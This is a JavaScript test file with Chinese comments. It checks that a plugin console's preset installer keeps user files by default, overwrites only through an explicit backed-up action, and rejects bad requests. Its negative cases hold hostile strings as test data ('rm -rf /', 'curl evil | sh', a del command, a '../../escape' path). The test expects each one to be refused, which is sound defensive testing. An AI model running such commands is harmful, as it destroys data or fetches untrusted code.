// 0.5.26 改错（F2 / F3）的**动作级**验收：预设装配默认只补不覆盖 + 显式「覆盖该预设」才覆盖 + 负例仍 400
//
// 复核报告（独立对抗式）的现场：一次预设装配改写了 3 个在用预设、**11 个文件**
// （`router-standard` 4 个，含 `agent.cordis.yml`），`overwritten=["agent.cordis.yml"]`。
// 有备份、有逐条报告（不静默），但**与上游 install.ps1 语义相反**（上游：「预设已存在 → 请先手动删除」= 跳过）。
//
// 本套把三条要求钉死（全离线：真 git + 本机裸仓库 + 真 runInstallJob / runSuggestedAction）：
//   ① **默认不覆盖**：用户原文件的 sha256 一字不变，且冲突被逐条点名 + note 给出「覆盖该预设」的出路；
//   ② 点 `overwrite-preset` **才**覆盖：有整目录备份、备份里是用户原来的内容、写后读回核实通过；
//   ③ 任意命令仍 **400 且零文件改动**（白名单不接受命令字符串，回归既有安全边界）；
//   ④ 附加：F3 的写前校验（非法 agent.cordis.yml 不写）、F4 的备份唯一路径、面板契约（中英双语按钮）。
import { strict as assert } from 'node:assert'
import { createHash } from 'node:crypto'
import { existsSync, mkdirSync, readFileSync, readdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { execFileSync } from 'node:child_process'
import { pathToFileURL } from 'node:url'
import { runInstallJob } from '../lib/server/domain/install-job.js'
import { runSuggestedAction, ACTION_KINDS } from '../lib/server/domain/plugin-actions.js'
import { installJobView } from '../lib/server/domain/install.js'
import { assemblePreset, presetSourceOf, suggestedOverwritePresetAction, uniqueBackupPath } from '../lib/server/domain/preset-install.js'
import { validateAgentConfig } from '../lib/server/domain/preset-yaml.js'
import { disposeDir } from '../lib/server/infra/fsx.js'
import { gitBin } from '../lib/server/infra/exec.js'

let pass = 0
let fail = 0
function check(name, ok, info = '') {
  if (ok) { pass += 1; console.log(`PASS ${name}${info === '' ? '' : ` — ${info}`}`) } else { fail += 1; console.log(`FAIL ${name}${info === '' ? '' : ` — ${info}`}`) }
}
const sha = (p) => createHash('sha256').update(readFileSync(p)).digest('hex')

const HOME = join(tmpdir(), `dsh-preset-ovw-${process.pid}`)
const PROFILE = join(HOME, 'profiles', 'web')
const PRESETS = join(HOME, '.agent-presets')
mkdirSync(PROFILE, { recursive: true })
mkdirSync(PRESETS, { recursive: true })
writeFileSync(join(PROFILE, 'package.json'), JSON.stringify({ name: 'dsh-profile-web', private: true }, null, 2), 'utf8')
writeFileSync(join(PROFILE, 'cordis.patch.yml'), '# fixture\n', 'utf8')
writeFileSync(join(PROFILE, 'cordis.yml'), 'plugins: []\n', 'utf8')
mkdirSync(join(HOME, 'plugin-console'), { recursive: true })
const savedHome = process.env.DSH_HOME
process.env.DSH_HOME = HOME

// ── 夹具：本机裸仓库（结构照抄真机 dsh-routing-suite：根包 private + preset/ 里一个预设）──────────
const GITROOT = join(HOME, 'gitroot')
const WORK = join(HOME, 'work')
mkdirSync(join(WORK, 'preset', 'router-standard'), { recursive: true })
const REPO_AGENT_YML = '# 仓库版\n- id: persona\n  name: "@probe/persona"\n  config:\n    prefix: >-\n      仓库版人格。\n- id: core\n  name: ./router-core.mjs\n'
writeFileSync(join(WORK, 'package.json'), JSON.stringify({ name: '@dsh-external/dsh-super-injector', version: '0.3.3', private: true }, null, 2), 'utf8')
writeFileSync(join(WORK, 'preset', 'package.json'), JSON.stringify({ name: 'dsh-router-standard', version: '0.3.0' }, null, 2), 'utf8')
writeFileSync(join(WORK, 'preset', 'router-standard', 'agent.cordis.yml'), REPO_AGENT_YML, 'utf8')
writeFileSync(join(WORK, 'preset', 'router-standard', 'preset.yml'), 'name: Router Standard\norder: 1\n', 'utf8')
writeFileSync(join(WORK, 'preset', 'router-standard', 'router-core.mjs'), 'export const version = "repo"\n', 'utf8')
{
  const git = gitBin()
  const run = (cwd, args) => execFileSync(git, args, {
    cwd, stdio: 'ignore', windowsHide: true,
    env: { ...process.env, GIT_AUTHOR_NAME: 'fixture', GIT_AUTHOR_EMAIL: 'fixture@local', GIT_COMMITTER_NAME: 'fixture', GIT_COMMITTER_EMAIL: 'fixture@local' },
  })
  run(WORK, ['init', '-q'])
  run(WORK, ['add', '-A'])
  run(WORK, ['commit', '-qm', 'fixture'])
  mkdirSync(join(GITROOT, 'probe-org'), { recursive: true })
  run(HOME, ['clone', '-q', '--bare', WORK, join(GITROOT, 'probe-org', 'routing-suite.git')])
  writeFileSync(join(HOME, 'plugin-console-sources.json'), JSON.stringify({
    registries: [{ id: 'noop', name: '无源', url: 'http://127.0.0.1:1', primary: true }],
    gitSources: [{ id: 'local-bare', name: '本机裸仓库', urlTemplate: `${pathToFileURL(GITROOT).href}/{owner}/{repo}.git`, primary: true }],
    archiveSources: [{ id: 'dead', name: '死源', urlTemplate: 'http://127.0.0.1:1/{owner}/{repo}/archive/{branch}.tar.gz', primary: true }],
    indexSources: [],
  }, null, 2), 'utf8')
}
const REPO = 'probe-org/routing-suite'
const CANDIDATE = 'dsh-router-standard'
const DEST = join(PRESETS, 'router-standard')
const cloneOpts = { probeDetail: async () => ({ alive: true, kind: 'local', status: null, note: '本地裸仓库' }), archive: null, reuseLanded: false }
const sourceDeps = { sizeDeps: { probe: async () => ({ state: 'known', sizeKb: 1334 }) }, fetchDeps: { cloneOpts }, presetsRoot: PRESETS, home: HOME }
const ports = { baseUrl: pathToFileURL(join(PROFILE, 'cordis.yml')).href, loader: { entries: () => [] }, get: () => undefined }
const channelStubs = {
  raceInstallChannels: async () => null,
  pnpmInstall: async () => { throw new Error('桩：registry 404') },
  curlManualInstall: async () => { throw new Error('桩：curl 404') },
  githubReleaseInstall: async () => { throw new Error('桩：release 无资产') },
  backfillMissingDeps: async () => [],
}
const marketProbes = {
  fetchRepoPackageEx: async () => ({ pkg: { name: '@dsh-external/dsh-super-injector', private: true }, reason: 'ok' }),
  fetchRepoPackage: async () => ({ name: '@dsh-external/dsh-super-injector', private: true }),
  subpackageCandidates: async () => ['@probe/stub-graded-mode', CANDIDATE],
  fetchSubpackageNames: async () => [],
  expandSubpackages: async () => [],
  namePublished: async () => false,
  probeGitmodules: async () => null,
}
const runPresetJob = async (id) => {
  const job = {
    id, repo: REPO, source: 'github', packageName: CANDIDATE,
    status: 'installing', stage: 'preparing', error: null, startedAt: Date.now(), finishedAt: null,
    entryId: null, bundle: false, ai: false, aiNote: null, subpackages: null, lastError: null, update: false, kind: 'plugin',
  }
  await runInstallJob(job, { ...ports, get: (key) => (key === 'installChannels' ? channelStubs : undefined) },
    { jobBudgetMs: 60000, aiConsentTimeoutMs: 300, marketProbes, sourceDeps })
  return job
}

// ── ① 首次装配：预设落到 .agent-presets，配置可解析（面板要能贴首行）──────────────────────────
const first = await runPresetJob('ovw-1')
// 0.5.28 改错：note 必须按**实际声明结果**说（框架 0.1.7-rc.x 起没有声明行就选不到预设），
// 旧文案"新建会话时选择"是谎话。本作业没有目标 profile 可写 → 必须如实说"需要声明行"。
check('① 首次装配成功（status=done，presetNote **如实**说明"需要声明行"，不再谎称"新建会话时选择"）',
  first.status === 'done' && /需要声明行/u.test(String(first.presetNote ?? ''))
  && !/新建会话时选择/u.test(String(first.presetNote ?? '')), `status=${first.status} note=${String(first.presetNote).slice(0, 200)}`)
check('① 预设落盘到 <DSH_HOME>/.agent-presets/router-standard/agent.cordis.yml',
  existsSync(join(DEST, 'agent.cordis.yml')) && existsSync(join(DEST, 'router-core.mjs')))
check('① 落盘的 agent.cordis.yml **结构合法**（贴得出内容）',
  validateAgentConfig(readFileSync(join(DEST, 'agent.cordis.yml'), 'utf8')).ok === true,
  JSON.stringify(readFileSync(join(DEST, 'agent.cordis.yml'), 'utf8').split('\n')[0]))
check('① 源码出处被记下（覆盖动作要靠它重新取源码）',
  presetSourceOf('router-standard', HOME)?.repo === REPO && presetSourceOf('router-standard', HOME)?.candidateName === CANDIDATE,
  JSON.stringify(presetSourceOf('router-standard', HOME)))

// ── ② 用户改了在用预设（模拟真机那三个在用预设）→ 再装一次：**默认绝不覆盖**────────────────────
writeFileSync(join(DEST, 'agent.cordis.yml'), '# 用户自己的版本\n- id: persona\n  name: "@user/persona"\n', 'utf8')
writeFileSync(join(DEST, 'router-core.mjs'), 'export const version = "user"\n', 'utf8')
writeFileSync(join(DEST, 'user-only.mjs'), 'export const mine = true\n', 'utf8')
const userConfigSha = sha(join(DEST, 'agent.cordis.yml'))
const userCoreSha = sha(join(DEST, 'router-core.mjs'))
const backupsBefore = readdirSync(PRESETS).filter((n) => n.includes('.bak-')).length
const second = await runPresetJob('ovw-2')
check('★★② 默认语义：用户原文件 sha256 **一字不变**（agent.cordis.yml）',
  sha(join(DEST, 'agent.cordis.yml')) === userConfigSha, `${userConfigSha.slice(0, 16)} → ${sha(join(DEST, 'agent.cordis.yml')).slice(0, 16)}`)
check('★★② 默认语义：用户原文件 sha256 **一字不变**（router-core.mjs）',
  sha(join(DEST, 'router-core.mjs')) === userCoreSha)
check('★② 默认语义：用户独有文件仍在（不是 rm -rf 重建）', existsSync(join(DEST, 'user-only.mjs')))
check('★② 默认语义：**没有多出任何备份目录**（没覆盖就不该有 .bak）',
  readdirSync(PRESETS).filter((n) => n.includes('.bak-')).length === backupsBefore,
  `before=${backupsBefore} after=${readdirSync(PRESETS).filter((n) => n.includes('.bak-')).length}`)
check('★★② 默认语义：冲突文件被**逐条点名**（presetInstalled[].skipped 里看得到）',
  Array.isArray(second.presetInstalled) && second.presetInstalled.some((p) => (p.skipped ?? []).includes('agent.cordis.yml') && p.mode === 'add-only'),
  JSON.stringify(second.presetInstalled?.map((p) => ({ name: p.name, mode: p.mode, skipped: p.skipped }))))
check('★★② 默认语义：note 明说「默认只补不覆盖」并给出「覆盖该预设」这条出路',
  /只补不覆盖|只补缺失文件/u.test(String(second.presetNote)) && /覆盖该预设/u.test(String(second.presetNote)),
  String(second.presetNote).slice(0, 260))
check('★★② 默认语义：服务端下发**结构化** suggestedAction（kind=overwrite-preset）供面板出按钮',
  second.suggestedAction?.kind === 'overwrite-preset' && second.suggestedAction?.payload?.action === 'overwrite-preset'
  && second.suggestedAction?.payload?.presetName === 'router-standard',
  JSON.stringify(second.suggestedAction ?? null))
check('★★② 面板契约：installJobView 把 suggestedAction 一起下发（/state 轮询也拿得到）',
  installJobView(second).suggestedAction?.kind === 'overwrite-preset'
  && installJobView(second).presetOverwriteCandidates?.includes('router-standard'),
  JSON.stringify({ kind: installJobView(second).suggestedAction?.kind, cands: installJobView(second).presetOverwriteCandidates }))
check('② 面板契约：动作里没有命令字符串位置（只有 action/presetName/repo）',
  ['command'].every((k) => !(k in (second.suggestedAction?.payload ?? {})))
  && Object.keys(second.suggestedAction?.payload ?? {}).sort().join(',') === 'action,presetName,repo',
  JSON.stringify(second.suggestedAction?.payload))

// ── ③ 点「覆盖该预设」→ 才覆盖（有整目录备份、备份里是用户原来的内容、写后读回核实）────────────
const actionShaBefore = sha(join(DEST, 'agent.cordis.yml'))
const requested = { action: 'overwrite-preset', presetName: 'router-standard' }
const applied = await runSuggestedAction({ body: requested, profileDir: PROFILE, registries: ['http://127.0.0.1:1'], deps: { overwriteDeps: sourceDeps } })
check('★★③ 显式动作：ok=true、exitCode=0、且只认结构化 presetName（ACTION_KINDS 里有它）',
  applied.ok === true && applied.exitCode === 0 && ACTION_KINDS.includes('overwrite-preset'), JSON.stringify({ ok: applied.ok, exitCode: applied.exitCode, reason: String(applied.reason).slice(0, 120) }))
check('★★③ 显式动作：**整目录备份**存在，且备份里是**用户原来的**内容（不是覆盖后的）',
  typeof applied.backup === 'string' && existsSync(applied.backup)
  && sha(join(applied.backup, 'agent.cordis.yml')) === actionShaBefore
  && existsSync(join(applied.backup, 'user-only.mjs')),
  `backup=${String(applied.backup)}`)
check('★★③ 显式动作：**真的覆盖了**（落盘内容 = 仓库版，与用户版不同）',
  sha(join(DEST, 'agent.cordis.yml')) !== actionShaBefore
  // git checkout 在 Windows 上按 autocrlf 落 CRLF，比较时统一按 LF 归一（仓库版内容必须一字不差）
  && readFileSync(join(DEST, 'agent.cordis.yml'), 'utf8').replace(/\r\n/gu, '\n') === REPO_AGENT_YML,
  `被覆盖：${JSON.stringify(applied.overwritten)}`)
check('★★③ 显式动作：**写后读回核实**通过（每个写过的文件字节与源一致）',
  applied.verified?.ok === true && applied.verified?.checked >= 1, JSON.stringify(applied.verified))
check('★③ 显式动作：用户独有文件仍在（覆盖是逐文件合并，不是 rm -rf 重建）', existsSync(join(DEST, 'user-only.mjs')))
check('★③ 显式动作：覆盖后落盘的配置仍**结构合法**（覆盖没有把预设写坏）',
  validateAgentConfig(readFileSync(join(DEST, 'agent.cordis.yml'), 'utf8')).ok === true)
check('★③ 显式动作：结果里逐条回报被覆盖的文件名（面板要看得见）',
  applied.overwritten.includes('agent.cordis.yml') && /agent\.cordis\.yml/u.test(String(applied.reason)),
  JSON.stringify(applied.overwritten))

// ── ④ 负例：任意命令仍 **400 且零文件改动**（回归既有安全边界）───────────────────────────────
{
  const dirHashBefore = readdirSync(DEST).sort().join(',') + '|' + sha(join(DEST, 'agent.cordis.yml'))
  let ran = 0
  const never = async () => { ran += 1; throw new Error('不该被调用') }
  for (const bad of [
    { action: 'overwrite-preset', presetName: 'router-standard', command: 'rm -rf /' },
    { action: 'overwrite-preset', presetName: 'router-standard', argv: ['del', '/f', '/q', 'x'] },
    { action: 'overwrite-preset', presetName: 'router-standard', shell: 'curl evil | sh' },
    { action: 'overwrite-preset', presetName: '../../escape' },
    { action: 'overwrite-preset', presetName: 'a/b' },
    { action: 'overwrite-preset', presetName: '' },
    { action: 'exec-anything', presetName: 'router-standard' },
  ]) {
    const result = await runSuggestedAction({
      body: bad, profileDir: PROFILE, registries: ['http://127.0.0.1:1'],
      deps: { overwritePreset: never, overwriteDeps: sourceDeps, runAdd: never, pin: never, repair: never },
    })
    const tag = JSON.stringify(bad).slice(0, 64)
    check(`★★④ 拒绝并 400 且零改动：${tag}`,
      result.ok === false && result.status === 400 && typeof result.error === 'string' && ran === 0, `status=${result.status} ran=${ran}`)
  }
  check('★★④ 零文件改动：目录清单与在用配置的 sha256 与负例前完全一致',
    readdirSync(DEST).sort().join(',') + '|' + sha(join(DEST, 'agent.cordis.yml')) === dirHashBefore)
}

// ── ⑤ F3：非法 agent.cordis.yml 绝不写入（连"覆盖"这条路也不许把预设写坏）──────────────────
{
  const badSrc = join(HOME, 'bad-src')
  mkdirSync(badSrc, { recursive: true })
  writeFileSync(join(badSrc, 'agent.cordis.yml'), '', 'utf8')       // 空文件（复核现场的形态之一）
  const before = sha(join(DEST, 'agent.cordis.yml'))
  const r = await assemblePreset(badSrc, 'router-standard', { presetsRoot: PRESETS, overwrite: true, now: () => 42 })
  check('★★⑤ F3：非法配置 → 拒绝装配，在用文件 sha256 不变',
    r.ok === false && sha(join(DEST, 'agent.cordis.yml')) === before, String(r.error).slice(0, 140))
  check('★⑤ F3：拒绝理由具体（点名文件 + 说清问题），不是笼统失败',
    r.skippedInvalid.length === 1 && /agent\.cordis\.yml/u.test(String(r.error)) && /结构校验/u.test(String(r.error)), String(r.error).slice(0, 160))
  check('★⑤ F3：**没有**因为这次失败多出 .bak 目录（校验发生在备份之前）',
    !readdirSync(PRESETS).some((n) => n === 'router-standard.bak-42'), JSON.stringify(readdirSync(PRESETS)))
}

// ── ⑥ F4：备份路径唯一（真装配两次、同一时间值，两个备份各自完整）────────────────────────────
{
  const src = join(HOME, 'f4-src')
  mkdirSync(src, { recursive: true })
  writeFileSync(join(src, 'agent.cordis.yml'), '- id: repo\n  name: b\n', 'utf8')
  const b1 = await assemblePreset(src, 'f4-probe', { presetsRoot: PRESETS, now: () => 777 })
  check('⑥ F4 前置：首次装配不建备份（本来就没有同名预设）', b1.ok === true && b1.backup === null)
  writeFileSync(join(PRESETS, 'f4-probe', 'agent.cordis.yml'), '- id: user1\n  name: b\n', 'utf8')
  const b2 = await assemblePreset(src, 'f4-probe', { presetsRoot: PRESETS, now: () => 777, overwrite: true })
  writeFileSync(join(PRESETS, 'f4-probe', 'agent.cordis.yml'), '- id: user2\n  name: b\n', 'utf8')
  const b3 = await assemblePreset(src, 'f4-probe', { presetsRoot: PRESETS, now: () => 777, overwrite: true })
  check('★⑥ F4：同一时间值的两次覆盖 → 备份路径**不同**（不再互相覆盖）',
    typeof b2.backup === 'string' && typeof b3.backup === 'string' && b2.backup !== b3.backup, `${b2.backup} vs ${b3.backup}`)
  check('★★⑥ F4：两个备份**各自完整**（第一个存 user1、第二个存 user2，都没被对方盖掉）',
    readFileSync(join(b2.backup, 'agent.cordis.yml'), 'utf8').includes('user1')
    && readFileSync(join(b3.backup, 'agent.cordis.yml'), 'utf8').includes('user2'),
    `${JSON.stringify(readFileSync(join(b2.backup, 'agent.cordis.yml'), 'utf8'))} / ${JSON.stringify(readFileSync(join(b3.backup, 'agent.cordis.yml'), 'utf8'))}`)
  const p = uniqueBackupPath(join(PRESETS, 'f4-probe'), 777)
  check('★⑥ F4：备份路径已存在 → 自增后缀（不覆盖既有备份）', p !== b2.backup, p)
}

// ── ⑦ 面板契约：中英双语短句 + 按钮只由服务端下发的动作类型决定 ──────────────────────────────
{
  const src = readFileSync('lib/client.js', 'utf8')
  check('★⑦ 面板有「覆盖该预设」中英双语短句',
    src.includes('actionOverwritePresetLabel: "覆盖该预设"') && src.includes('actionOverwritePresetLabel: "Overwrite this preset"'))
  check('★⑦ 面板按钮只在 kind === "overwrite-preset" 时出现（默认装配不多一个像素）',
    /action\.kind === "overwrite-preset"/u.test(src) && src.includes('data-overwrite-preset'))
  check('★⑦ 面板只发结构化 payload（不拼命令）：调用点仍是 callAction(action.payload)',
    src.includes('callAction(action.payload)') && /const runOverwrite[\s\S]{0,600}callAction\(action\.payload\)/u.test(src))
  check('★⑦ 长解释里写明"会先把原目录整份备份"（中英各一份）',
    src.includes('整份备份') && /copies your whole current directory to/u.test(src))
}

// ── 收尾 ────────────────────────────────────────────────────────────────────────────────
if (savedHome === undefined) delete process.env.DSH_HOME
else process.env.DSH_HOME = savedHome
try { disposeDir(HOME) } catch {}
assert.ok(pass > 0)
console.log(`\n${fail === 0 ? 'ALL PASS' : `${fail} FAILED`}（PASS ${pass} / FAIL ${fail}）`)
process.exit(fail === 0 ? 0 : 1)
